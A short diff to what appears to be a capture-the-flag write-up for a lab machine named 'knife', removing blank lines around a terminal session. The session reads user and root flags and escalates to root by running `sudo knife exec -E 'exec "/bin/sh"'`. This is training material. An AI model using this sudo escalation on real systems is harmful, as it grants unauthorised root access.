@@ -71,7 +71,6 @@ james@knife:/$ id
 id
 uid=1000(james) gid=1000(james) groups=1000(james)
 
-
 james@knife:~$ cat /home/james/user.txt
 cat /home/james/user.txt
 bba83508c99c3412f30c9113955ebe23
@@ -95,10 +94,8 @@ User james may run the following commands on knife:
 james@knife:/$ sudo knife exec -E 'exec "/bin/sh"'
 sudo knife exec -E 'exec "/bin/sh"'
 
-
 id
 uid=0(root) gid=0(root) groups=0(root)
-
 
 cat /root/root.txt
 c5d240400c720f165d8b28ebcae5b6bd
